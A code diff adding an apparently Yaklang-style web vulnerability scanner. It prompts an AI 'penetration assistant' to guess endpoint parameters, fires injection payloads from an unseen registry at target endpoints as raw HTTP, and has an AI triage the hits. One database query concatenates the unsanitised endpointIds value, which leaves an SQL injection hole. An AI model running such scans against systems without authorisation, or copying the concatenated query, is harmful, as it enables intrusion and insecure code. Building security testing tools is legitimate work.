+        if params == nil || len(params) == 0 { return basePath, method, "" }
+        p0 = params[0]
+        name = str.TrimSpace(sprint(p0["name"]))
+        sample = sprint(p0["sample"])
+        if sample == "" { sample = "test" }
+        if name == "" { return basePath, method, "" }
+        if str.Contains(basePath, "?") {
+            return replaceFirstQueryValueWithPlaceholder(appendFirstQueryParam(basePath, name)), method, ""
+        }
+        return basePath + "?" + name + "=" + codec.EscapeQueryUrl(sample), method, ""
+    }
+    if style == "path_only" {
+        return basePath, method, ""
+    }
+    body = buildBodyFromCandidateParams(style, params)
+    return basePath, method, body
+}
+
+probeCandidateHTTP = (candidate, pathPattern) => {
+    url, method, body = buildURLFromCandidate(candidate, pathPattern)
+    style = str.ToLower(str.TrimSpace(sprint(candidate["param_style"])))
+    ct = str.TrimSpace(sprint(candidate["content_type"]))
+    if ct == "" {
+        if style == "json_body" { ct = "application/json" }
+        if style == "form_body" { ct = "application/x-www-form-urlencoded" }
+    }
+    hostAu = extractHostAuthorityFromBase(baseURL)
+    pathQ = extractPathQueryFromJoinedURL(url)
+    if pathQ == "" { pathQ = "/" }
+    if !str.HasPrefix(pathQ, "/") { pathQ = "/" + pathQ }
+    if method == "" { method = "GET" }
+    if method == "GET" || method == "HEAD" {
+        pkt = sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nAccept: */*\r\n\r\n", method, pathQ, hostAu)
+        return sendRawHTTPProbe(pkt)
+    }
+    bm = method
+    if body == "" {
+        if style == "form_body" { body = "a=b" } else { body = "{}" }
+    }
+    if ct == "" { ct = "application/json" }
+    pkt = sprintf("%s %s HTTP/1.1\r\nHost: %s\r\nContent-Type: %s\r\nConnection: close\r\n\r\n%s", bm, pathQ, hostAu, ct, body)
+    return sendRawHTTPProbe(pkt)
+}
+
+candidateToQueryParamsJSON = params => {
+    if params == nil { return "" }
+    try { return string(json.dumps(params)) } catch ex { return "" }
+}
+
+candidateToBodyHintJSON = (style, params) => {
+    st = str.ToLower(str.TrimSpace(style))
+    if st != "json_body" && st != "form_body" { return "" }
+    if params == nil { return "" }
+    m = make(map[string]string)
+    for p in params {
+        n = sprint(p["name"])
+        if n != "" { m[n] = "string" }
+    }
+    try { return string(json.dumps(m)) } catch ex { return "" }
+}
+
+applyResolvedCandidate = (cand, pathPattern) => {
+    style = str.ToLower(str.TrimSpace(sprint(cand["param_style"])))
+    params = cand["params"]
+    method = str.ToUpper(str.TrimSpace(sprint(cand["method"])))
+    baseJoin = joinURL(baseURL, samplePathLiteral(pathPattern))
+    sampledJoin = baseJoin
+    qjson = candidateToQueryParamsJSON(params)
+    bjson = candidateToBodyHintJSON(style, params)
+    if style == "query" || style == "query_string" {
+        if params != nil && len(params) > 0 {
+            name = str.TrimSpace(sprint(params[0]["name"]))
+            if name != "" { sampledJoin = appendFirstQueryParam(baseJoin, name) }
+        }
+    }
+    if method == "" { method = "GET" }
+    return {
+        "ok": true,
+        "sampled_join": sampledJoin,
+        "body_hint_json": bjson,
+        "query_params_json": qjson,
+        "method": method,
+    }
+}
+
+resolveEndpointInjectionViaAI = (meth, pathPattern, handler, meta, fallbackJoin) => {
+    failOut = {
+        "ok": false,
+        "sampled_join": fallbackJoin,
+        "body_hint_json": "",
+        "query_params_json": "",
+        "method": meth,
+    }
+    if skipAiParamGuess {
+        printf("[vuln_batch_scan] skip ai param guess (flag) %s %s\n", meth, pathPattern)
+        return failOut
+    }
+    codeSnippet = ""
+    handlerSym = handler
+    if meta != nil {
+        codeSnippet = truncateStr(sprint(meta["code_snippet"]), 2000)
+        hs = str.TrimSpace(sprint(meta["handler_symbol"]))
+        if hs != "" { handlerSym = hs }
+    }
+
+    // --- 阶段 1：推断请求类型 / 参数形态（query vs json_body vs form_body）---
+    lockedStyle = ""
+    lockedMethod = meth
+    lockedCT = ""
+    styleFeedback = "（首轮无历史失败）"
+    for round = 1; round <= maxAiParamRounds; round++ {
+        stylePrompt = sprintf(`你是 API 渗透助手（直接输出 JSON，非 ReAct）。
+阶段 1/2：只判断「请求类型与参数形态」，暂不必精确参数名；每组可用通用占位参数名如 id、q、keyword。
+给出最多 %d 组候选，param_style 取值：
+- query：URL ?id=1 这类查询串
+- json_body：POST/PUT JSON 请求体
+- form_body：POST application/x-www-form-urlencoded
+- path_only：仅路径、无 query/body（最后手段）
+
+只输出 JSON：{"candidates":[{"param_style":"","method":"","content_type":"","params":[{"name":"id","sample":"1"}]}]}
+不要 Markdown。结合 Spring：@RequestParam->query，@RequestBody->json_body。
+勿重复上一轮 405/415 的组合。
+
+接口：%s %s
+handler：%s
+代码片段：
+%s
+base：%s
+上一轮失败：%s`,
+            maxAiParamCandidatesPerRound, meth, pathPattern, handlerSym, codeSnippet, baseURL, styleFeedback)
+
+        resp, err = aiParamChatJSON(stylePrompt)
+        if err != nil || resp == nil {
+            styleFeedback = sprint(err)
+            printf("[vuln_batch_scan] ai style round %d err: %s %s: %s\n", round, meth, pathPattern, styleFeedback)
+            continue
+        }
+        cands = resp["candidates"]
+        if cands == nil || len(cands) == 0 {
+            styleFeedback = "empty candidates"
+            continue
+        }
+        roundFails = []
+        tried = 0
+        for ci = 0; ci < len(cands) && tried < maxAiParamCandidatesPerRound; ci++ {
+            cand = cands[ci]
+            if cand == nil { continue }
+            tried++
+            pr = probeCandidateHTTP(cand, pathPattern)
+            if pr == nil {
+                roundFails = append(roundFails, sprintf("cand%d:no_response style=%s", ci, cand["param_style"]))
+                continue
+            }
+            sc = pr["status_code"]
+            if !probeCandidateAcceptable(sc) {
+                roundFails = append(roundFails, sprintf("cand%d:status=%v style=%s method=%s", ci, sc, cand["param_style"], cand["method"]))
+                continue
+            }
+            lockedStyle = str.ToLower(str.TrimSpace(sprint(cand["param_style"])))
+            lockedMethod = str.ToUpper(str.TrimSpace(sprint(cand["method"])))
+            if lockedMethod == "" { lockedMethod = meth }
+            lockedCT = str.TrimSpace(sprint(cand["content_type"]))
+            printf("[vuln_batch_scan] ai style locked round=%d %s %s style=%s method=%s status=%v\n",
+                round, meth, pathPattern, lockedStyle, lockedMethod, sc)
+            break
+        }
+        if lockedStyle != "" { break }
+        styleFeedback = str.Join(roundFails, "; ")
+        if styleFeedback == "" { styleFeedback = "all style candidates invalid" }
+        printf("[vuln_batch_scan] ai style round %d failed %s %s: %s\n", round, meth, pathPattern, truncateStr(styleFeedback, 500))
+    }
+    if lockedStyle == "" {
+        printf("[vuln_batch_scan] ai style give up: %s %s\n", meth, pathPattern)
+        return failOut
+    }
+    if lockedStyle == "path_only" {
+        return applyResolvedCandidate({
+            "param_style": "path_only",
+            "method": lockedMethod,
+            "content_type": lockedCT,
+            "params": [],
+        }, pathPattern)
+    }
+
+    // --- 阶段 2：在已锁定形态下猜参数名 ---
+    nameFeedback = "（首轮无历史失败）"
+    for round = 1; round <= maxAiParamRounds; round++ {
+        namePrompt = sprintf(`你是 API 渗透助手（直接输出 JSON，非 ReAct）。
+阶段 2/2：请求形态已确定为 param_style=%s method=%s content_type=%s。
+任务：猜测最可能的参数名，给出最多 %d 组 params（每组至少一个 {"name":"","sample":""}）。
+只输出 JSON：{"candidates":[{"params":[{"name":"","sample":""}]}]}，不要 Markdown。
+结合 Java/Spring 与 handler/代码片段推断真实字段名。
+
+接口：%s %s
+handler：%s
+代码片段：
+%s
+base：%s
+上一轮失败：%s`,
+            lockedStyle, lockedMethod, lockedCT, maxAiParamCandidatesPerRound,
+            meth, pathPattern, handlerSym, codeSnippet, baseURL, nameFeedback)
+
+        resp2, err2 = aiParamChatJSON(namePrompt)
+        if err2 != nil || resp2 == nil {
+            nameFeedback = sprint(err2)
+            printf("[vuln_batch_scan] ai param-name round %d err: %s %s: %s\n", round, meth, pathPattern, nameFeedback)
+            continue
+        }
+        cands2 = resp2["candidates"]
+        if cands2 == nil || len(cands2) == 0 {
+            nameFeedback = "empty candidates"
+            continue
+        }
+        roundFails2 = []
+        tried2 = 0
+        for ci = 0; ci < len(cands2) && tried2 < maxAiParamCandidatesPerRound; ci++ {
+            item = cands2[ci]
+            if item == nil { continue }
+            tried2++
+            cand = {
+                "param_style": lockedStyle,
+                "method": lockedMethod,
+                "content_type": lockedCT,
+                "params": item["params"],
+            }
+            if cand["params"] == nil {
+                if item["name"] != nil {
+                    cand["params"] = [{"name": sprint(item["name"]), "sample": sprint(item["sample"])}]
+                }
+            }
+            pr = probeCandidateHTTP(cand, pathPattern)
+            if pr == nil {
+                roundFails2 = append(roundFails2, sprintf("cand%d:no_response", ci))
+                continue
+            }
+            sc = pr["status_code"]
+            if !probeCandidateAcceptable(sc) {
+                pnames = []
+                if cand["params"] != nil {
+                    for p in cand["params"] { pnames = append(pnames, sprint(p["name"])) }
+                }
+                roundFails2 = append(roundFails2, sprintf("cand%d:status=%v names=%s", ci, sc, str.Join(pnames, ",")))
+                continue
+            }
+            resolved = applyResolvedCandidate(cand, pathPattern)
+            printf("[vuln_batch_scan] ai param-name resolved round=%d %s %s names=%v status=%v\n",
+                round, meth, pathPattern, cand["params"], sc)
+            return resolved
+        }
+        nameFeedback = str.Join(roundFails2, "; ")
+        if nameFeedback == "" { nameFeedback = "all name candidates invalid" }
+        printf("[vuln_batch_scan] ai param-name round %d failed %s %s: %s\n", round, meth, pathPattern, truncateStr(nameFeedback, 500))
+    }
+
+    printf("[vuln_batch_scan] ai param give up after style+name phases: %s %s\n", meth, pathPattern)
+    return failOut
+}
+
+resolveEndpointInjectionContext = (meth, pathPattern, handler, meta, fallbackJoin) => {
+    queryJSON = ""
+    bodyHint = ""
+    if meta != nil {
+        queryJSON = str.TrimSpace(sprint(meta["query_params_json"]))
+        bodyHint = str.TrimSpace(sprint(meta["body_hint_json"]))
+    }
+    sampledJoin = buildSampleJoinFromVhaMeta(meth, pathPattern, meta, fallbackJoin)
+    if hasInjectableParamMeta(sampledJoin, queryJSON, bodyHint) {
+        return {
+            "ok": true,
+            "sampled_join": sampledJoin,
+            "body_hint_json": bodyHint,
+            "query_params_json": queryJSON,
+            "method": meth,
+        }
+    }
+    return resolveEndpointInjectionViaAI(meth, pathPattern, handler, meta, fallbackJoin)
+}
+
+epQuery = sprintf("SELECT id, method, path_pattern, handler_class FROM http_endpoints WHERE session_id = %d", sessionID)
+idIn = str.TrimSpace(endpointIds)
+if idIn != "" { epQuery = epQuery + " AND id IN (" + idIn + ")" }
+epQuery = epQuery + " ORDER BY id ASC"
+
+endpoints, err = db.ScanResult(gormDB, epQuery)
+if err != nil { die(sprintf("query endpoints: %v", err)) }
+
+verifiedURLByEp = make(map[string]string)
+verifiedURLByPath = make(map[string]string)
+verifiedMetaByPath = make(map[string]string)
+
+vhaRows, vhaErr = db.ScanResult(gormDB, sprintf("SELECT method as m, path_pattern as pp, full_sample_url as ru, query_params_json as qp, body_hint_json as bh, code_snippet as cs, handler_symbol as hs FROM verified_http_apis WHERE session_id = %d AND verified = 1 ORDER BY id DESC", sessionID))
+if vhaErr != nil {
+    printf("[vuln_batch_scan] WARN load verified_http_apis: %v\n", vhaErr)
+} elif vhaRows != nil {
+    for vr in vhaRows {
+        m = str.ToUpper(str.TrimSpace(sprint(vr["m"])))
+        pp = str.TrimSpace(sprint(vr["pp"]))
+        ru = sprint(vr["ru"])
+        if m == "" || pp == "" { continue }
+        pk = m + " " + pp
+        if verifiedMetaByPath[pk] == nil {
+            verifiedMetaByPath[pk] = {
+                "full_sample_url": ru,
+                "query_params_json": sprint(vr["qp"]),
+                "body_hint_json": sprint(vr["bh"]),
+                "code_snippet": sprint(vr["cs"]),
+                "handler_symbol": sprint(vr["hs"]),
+            }
+        }
+        if ru != "" && verifiedURLByPath[pk] == "" {
+            verifiedURLByPath[pk] = ru
+        }
+    }
+}
+
+verRows, verErr = db.ScanResult(gormDB, sprintf("SELECT http_endpoint_id as hid, request_url as ru FROM verified_endpoints WHERE session_id = %d ORDER BY id DESC", sessionID))
+if verErr != nil {
+    printf("[vuln_batch_scan] WARN load verified_endpoints: %v\n", verErr)
+} elif verRows != nil {
+    for vr in verRows {
+        kid = sprint(vr["hid"])
+        ru = sprint(vr["ru"])
+        if kid == "" || ru == "" { continue }
+        if verifiedURLByEp[kid] == "" {
+            verifiedURLByEp[kid] = ru
+        }
+    }
+}
+
+printf("[vuln_batch_scan] loaded %d endpoints, resource_concurrent=%d http_concurrent=%d ai_concurrent=%d vha_paths=%d ep_lookup=%d\n", len(endpoints), resourceConcurrent, httpConcurrent, aiConcurrent, len(verifiedURLByPath), len(verifiedURLByEp))
+
+scanStartTime = time.Now()
+
+// ============================================================================
+// 全局统计（mutex 保护）
+// ============================================================================
+statsMu = sync.NewMutex()
+totalFindings = 0
+confirmedFindings = 0
+uncertainFindings = 0
+aiReviewedCount = 0
+keywordHitsCollected = 0
+
+incAiReviewed = () => { statsMu.Lock(); aiReviewedCount++; statsMu.Unlock() }
+
+insertFinding = (eid, vtype, sev, confidence, pay, reqURL, reqRaw, rspRaw, evidence, status, aiAnalysis) => {
+    statsMu.Lock()
+    defer statsMu.Unlock()
+    insertSQL = `INSERT INTO dynamic_vuln_findings 
+        (created_at, updated_at, session_id, http_endpoint_id, vuln_type, severity, confidence, 
+         payload, request_url, request_raw, response_raw, evidence, status, ai_analysis, code_context)
+        VALUES (CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, '')`
+    er = gormDB.Exec(insertSQL, int(sessionID), int(eid), vtype, sev, confidence,
+        pay, reqURL, reqRaw, rspRaw, evidence, status, aiAnalysis).Error
+    if er != nil { printf("[DB-ERROR] insert finding: %v\n", er) }
+    totalFindings++
+    if status == "confirmed" {
+        confirmedFindings++
+    } else {
+        uncertainFindings++
+    }
+}
+
+pendingMu = sync.NewMutex()
+pendingHits = []
+
+// ============================================================================
+// 并发控制池（高效模式：HTTP 与 AI 分离）
+// ============================================================================
+aiWg = sync.NewSizedWaitGroup(aiConcurrent)
+
+// ============================================================================
+// AI 辅助（仅批量二次研判阶段使用）
+// ============================================================================
+aiOpts = [ai.funcCallRetryTimes(2)]
+
+coerceTruthy = (v) => {
+    if v == false { return false }
+    if v == true { return true }
+    tl = str.ToLower(str.TrimSpace(sprint(v)))
+    if tl == "false" || tl == "no" || tl == "0" { return false }
+    return true
+}
+
+aiConfidenceReview = (vtName, vtKey, pay, reqURL, reqRaw, rspSnippet, epInfo) => {
+    if skipAiReview { return {"is_real": true, "confidence": 50, "analysis": "AI review skipped"} }
+    prompt = sprintf(`你是资深渗透测试工程师，判断以下检测结果是否像真实漏洞（含可利用弱信号）。
+漏洞: %s (%s) URL: %s 载荷: %s 端点: %s
+请求: %s
+响应截取: %s
+
+只输出紧凑 JSON（无 Markdown）：{"is_real":true或false,"confidence":0到100整数,"analysis":"简短中文"}
+
+若响应明显为框架默认页/WAF占位/与技术栈不符的告警则 is_real=false 且置信度要低。`,
+        vtName, vtKey, reqURL, pay, epInfo, reqRaw, rspSnippet)
+    aiWg.Add()
+    defer aiWg.Done()
+    raw = ""
+    try { raw = ai.Chat(prompt, aiOpts...)~ } catch ex { printf("[AI-review] error: %v\n", ex) }
+    incAiReviewed()
+    m = chatParseJSONObject(raw)
+    if m != nil {
+        ir = coerceTruthy(m["is_real"])
+        cn = 0
+        try { cn = parseInt(sprint(m["confidence"])) } catch ev { cn = 0 }
+        an = sprint(m["analysis"])
+        return {"is_real": ir, "confidence": cn, "analysis": an}
+    }
+    return {"is_real": false, "confidence": 0, "analysis": "AI review parse failed"}
+}
+
+resolveHeuristicTemplate = (meth, pathPattern, sampledJoinURL, vDef, bodyHintJSON, tmplCache) => {
+    cacheKey = meth + "|" + pathPattern + "|" + sprint(vDef["scope"]) + "|" + str.TrimSpace(bodyHintJSON)
+    if tmplCache[cacheKey] != nil && sprint(tmplCache[cacheKey]) != "" {
+        return sprint(tmplCache[cacheKey])
+    }
+    hpack = buildHeuristicInjectionPacket(meth, sampledJoinURL, vDef, bodyHintJSON)
+    if hpack != "" && countPlaceholder(hpack) == 1 {
+        tmplCache[cacheKey] = hpack
+        return hpack
+    }
+    tmplCache[cacheKey] = ""
+    return ""
+}
+
+// ============================================================================
+// 单端点 × 单漏洞类型：规则 payload HTTP 并发，命中写入 pendingHits
+// ============================================================================
+efficientScanOneVulnType = (epID, meth, pathPattern, handler, sampledJoinURL, bodyHintJSON, epStr, vtKey, vDef, tmplCache) => {
+    payloadList = vDef["payloads"]
+    if payloadList == nil || len(payloadList) == 0 { return }
+    inds = vDef["indicators"]
+    if inds == nil || len(inds) == 0 { return }
+
+    sev = "medium"
+    if vDef["severity"] != nil { sev = sprint(vDef["severity"]) }
+    isPs = false
+    if vDef["is_path_scan"] != nil { isPs = vDef["is_path_scan"] }
+
+    vtName = vtKey
+    if vDef["name"] != nil { vtName = sprint(vDef["name"]) }
+
+    injTmpl = ""
+    if !isPs {
+        injTmpl = resolveHeuristicTemplate(meth, pathPattern, sampledJoinURL, vDef, bodyHintJSON, tmplCache)
+        if injTmpl == "" { return }
+    }
+
+    payWg = sync.NewSizedWaitGroup(httpConcurrent)
+    for pi = 0; pi < len(payloadList); pi++ {
+        payWg.Add()
+        go fn(payIdx, eid, vtype, vtypeName, method, indicators, severity, isPathScan, epInfo, pktTmpl) {
+            defer payWg.Done()
+            pay = sprint(payloadList[payIdx])
+            if hostThrottleMs > 0 { sleep(float(hostThrottleMs) / 1000.0) }
+
+            try {
+                pr = nil
+                testURLDisp = sampledJoinURL
+                reqRawStore = ""
+
+                if isPathScan {
+                    pr = probePathScan(pay)
+                    testURLDisp = joinURL(baseURL, pay)
+                    reqRawStore = truncateStr(sprintf("path_scan probe: %s", testURLDisp), 800)
+                } else {
+                    sub = injectPayloadIntoRawPacket(pktTmpl, pay)
+                    pr = sendRawHTTPProbe(sub)
+                    testURLDisp = guessURLFromProbablePacket(sub)
+                    reqRawStore = truncateStr(sub, 4000)
+                    if pr != nil && pr["req_raw"] != nil && sprint(pr["req_raw"]) != "" {
+                        reqRawStore = truncateStr(sprint(pr["req_raw"]), 4000)
+                    }
+                }
+                if pr == nil { return }
+                body = pr["body"]
+                matched = checkIndicators(body, indicators)
+                if len(matched) == 0 {
+                    lb = str.ToLower(body)
+                    lp = str.ToLower(pay)
+                    if lp != "" && str.Contains(lb, lp) {
+                        matched = append(matched, "payload_reflected")
+                    }
+                    if str.Contains(lb, "\"query\"") && str.Contains(lb, "select") {
+                        matched = append(matched, "sql_query_exposed")
+                    }
+                }
+                if len(matched) == 0 { return }
+
+                rspSnippet = truncateStr(body, 2000)
+                hit = {
+                    "eid": eid, "vtype": vtype, "vtype_name": vtypeName, "method": method, "path": epInfo,
+                    "payload": pay, "url": testURLDisp,
+                    "req_raw": reqRawStore, "rsp_snippet": rspSnippet,
+                    "evidence": str.Join(matched, "; "), "severity": severity,
+                    "status_code": pr["status_code"], "ep_info": epInfo,
+                }
+                pendingMu.Lock()
+                pendingHits = append(pendingHits, hit)
+                keywordHitsCollected++
+                pendingMu.Unlock()
+            } catch ex {}
+        }(pi, epID, vtKey, vtName, meth, inds, sev, isPs, epStr, injTmpl)
+    }
+    payWg.Wait()
+}
+
+// ============================================================================
+// 主入口：端点并发 + 单端点内类型顺序 + 全局批量二次研判
+// ============================================================================
+
+apiDescText = ""
+if apiDesc != "" { apiDescText = sprintf("\n- API 描述: %s", apiDesc) }
+
+epWg = sync.NewSizedWaitGroup(resourceConcurrent)
+
+for ei = 0; ei < len(endpoints); ei++ {
+    epWg.Add()
+    go fn(epIdx) {
+        defer epWg.Done()
+        ep = endpoints[epIdx]
+        epID = parseInt(sprint(ep["id"]))
+        meth = str.ToUpper(str.TrimSpace(sprintf("%v", ep["method"])))
+        if meth == "" { meth = "GET" }
+        pathPattern = sprintf("%v", ep["path_pattern"])
+        handler = sprintf("%v", ep["handler_class"])
+        if handler == "<nil>" { handler = "" }
+        epStr = sprintf("method=%s path=%s handler=%s", meth, pathPattern, handler)
+
+        eKey = sprint(ep["id"])
+        pathKey = meth + " " + str.TrimSpace(pathPattern)
+        vhaMeta = verifiedMetaByPath[pathKey]
+        phase3RU = verifiedURLByPath[pathKey]
+        if phase3RU == "" {
+            phase3RU = verifiedURLByEp[eKey]
+        }
+        fallbackJoin = str.TrimSpace(phase3RU)
+        if fallbackJoin == "" {
+            fallbackJoin = joinURL(baseURL, samplePathLiteral(pathPattern))
+        }
+        injCtx = resolveEndpointInjectionContext(meth, pathPattern, handler, vhaMeta, fallbackJoin)
+        if injCtx == nil || injCtx["ok"] != true {
+            printf("[vuln_batch_scan] skip endpoint (no param context): %s %s\n", meth, pathPattern)
+            return
+        }
+        sampledJoin = str.TrimSpace(sprint(injCtx["sampled_join"]))
+        bodyHintJSON = str.TrimSpace(sprint(injCtx["body_hint_json"]))
+        scanMeth = str.ToUpper(str.TrimSpace(sprint(injCtx["method"])))
+        if scanMeth == "" { scanMeth = meth }
+
+        isLogin = isLoginEndpoint(pathPattern, handler)
+        isRoot = isRootPath(pathPattern)
+        tmplCache = make(map[string]string)
+
+        // 登录端点仅接受 POST JSON/form，跳过以免 GET 探测引发 405/415 噪音
+        if isLogin { return }
+
+        for vi = 0; vi < len(activeVulnTypes); vi++ {
+            vtKey = activeVulnTypes[vi]
+            vDef = vulnTypeRegistry[vtKey]
+            if vDef == nil { continue }
+            scope = "all"
+            if vDef["scope"] != nil { scope = sprint(vDef["scope"]) }
+            if scope == "login_only" && !isLogin { continue }
+            if scope == "root_only" && !isRoot { continue }
+
+            efficientScanOneVulnType(epID, scanMeth, pathPattern, handler, sampledJoin, bodyHintJSON, epStr, vtKey, vDef, tmplCache)
+        }
+    }(ei)
+}
+
+epWg.Wait()
+httpPhaseElapsed = time.Since(scanStartTime)
+printf("[vuln_batch_scan] HTTP phase done: keyword_hits=%d elapsed=%.2fs\n", keywordHitsCollected, httpPhaseElapsed.Seconds())
+
+// --- 批量二次研判（Congin efficient 模式：统一后置） ---
+judgmentStart = time.Now()
+judgedHits = []
+
+if len(pendingHits) > 0 {
+    judgmentWg = sync.NewSizedWaitGroup(aiConcurrent)
+    resultMu = sync.NewMutex()
+
+    for hi = 0; hi < len(pendingHits); hi++ {
+        judgmentWg.Add()
+        go fn(hitIdx) {
+            defer judgmentWg.Done()
+            hit = pendingHits[hitIdx]
+            vtName = sprint(hit["vtype_name"])
+            if vtName == "" { vtName = sprint(hit["vtype"]) }
+
+            conf = 55
+            aiNote = "keyword heuristic hit"
+            if !skipAiReview {
+                rv = aiConfidenceReview(vtName, sprint(hit["vtype"]), sprint(hit["payload"]), sprint(hit["url"]), sprint(hit["req_raw"]), sprint(hit["rsp_snippet"]), sprint(hit["ep_info"]))
+                conf = 0
+                aiNote = ""
+                if rv != nil {
+                    if rv["confidence"] != nil { conf = parseInt(sprint(rv["confidence"])) }
+                    if rv["analysis"] != nil { aiNote = sprint(rv["analysis"]) }
+                    if rv["is_real"] == false {
+                        conf = min(conf, 30)
+                        aiNote = "[AI判定: 误报] " + aiNote
+                    }
+                }
+            }
+
+            dedupeKey = sprintf("%v|%v", hit["eid"], hit["vtype"])
+            hit["confidence"] = conf
+            hit["ai_analysis"] = aiNote
+            if conf >= 70 {
+                hit["status"] = "confirmed"
+            } elif conf <= 25 {
+                hit["status"] = "false_positive"
+            } else {
+                hit["status"] = "uncertain"
+            }
+            hit["dedupe_key"] = dedupeKey
+
+            resultMu.Lock()
+            replaced = false
+            for ji = 0; ji < len(judgedHits); ji++ {
+                if sprint(judgedHits[ji]["dedupe_key"]) != dedupeKey { continue }
+                prevConf = 0
+                if judgedHits[ji]["confidence"] != nil { prevConf = parseInt(sprint(judgedHits[ji]["confidence"])) }
+                if conf > prevConf {
+                    judgedHits[ji] = hit
+                }
+                replaced = true
+                break
+            }
+            if !replaced {
+                judgedHits = append(judgedHits, hit)
+            }
+            resultMu.Unlock()
+        }(hi)
+    }
+    judgmentWg.Wait()
+}
+
+for hi2 = 0; hi2 < len(judgedHits); hi2++ {
+    hit = judgedHits[hi2]
+    insertFinding(hit["eid"], hit["vtype"], hit["severity"], hit["confidence"], hit["payload"], hit["url"], hit["req_raw"], hit["rsp_snippet"], hit["evidence"], hit["status"], hit["ai_analysis"])
+    printf("[FOUND] %s eid=%v conf=%d status=%s url=%s\n", hit["vtype"], hit["eid"], hit["confidence"], hit["status"], hit["url"])
+}
+
+judgmentElapsed = time.Since(judgmentStart)
+totalElapsed = time.Since(scanStartTime)
+
+printf("\n========================================\n")
+printf("vuln_batch_scan complete (efficient mode)\n")
+printf("  endpoints:           %d\n", len(endpoints))
+printf("  resource_concurrent: %d\n", resourceConcurrent)
+printf("  http_concurrent:     %d\n", httpConcurrent)
+printf("  ai_concurrent:       %d\n", aiConcurrent)
+printf("  keyword_hits:        %d\n", keywordHitsCollected)
+printf("  total_findings:      %d\n", totalFindings)
+printf("  confirmed:           %d\n", confirmedFindings)
+printf("  uncertain:           %d\n", uncertainFindings)
+printf("  false_positive:      %d\n", totalFindings - confirmedFindings - uncertainFindings)
+printf("  ai_reviewed:         %d\n", aiReviewedCount)
+printf("  http_phase_sec:      %.2f\n", httpPhaseElapsed.Seconds())
+printf("  judgment_phase_sec:  %.2f\n", judgmentElapsed.Seconds())
+printf("  total_elapsed_sec:   %.2f\n", totalElapsed.Seconds())
+printf("========================================\n")
